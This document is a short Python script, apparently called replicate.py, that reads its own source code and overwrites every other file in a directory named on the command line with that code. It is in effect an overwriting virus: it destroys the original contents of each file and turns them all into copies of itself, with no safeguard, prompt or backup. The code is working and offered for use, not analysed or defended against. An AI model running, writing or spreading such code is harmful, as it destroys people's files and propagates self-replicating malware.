import os
import sys

def replicate_in_directory(target_directory):

    current_script_path = os.path.abspath(__file__)

    with open(current_script_path, 'r') as script_file:
        script_content = script_file.read()

    for filename in os.listdir(target_directory):
        file_path = os.path.join(target_directory, filename)
        

        if os.path.isfile(file_path) and file_path != current_script_path:
            
            with open(file_path, 'w') as target_file:
                target_file.write(script_content)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python replicate.py <target_directory>")
        sys.exit(1)

    target_directory = sys.argv[1]
    replicate_in_directory(target_directory)
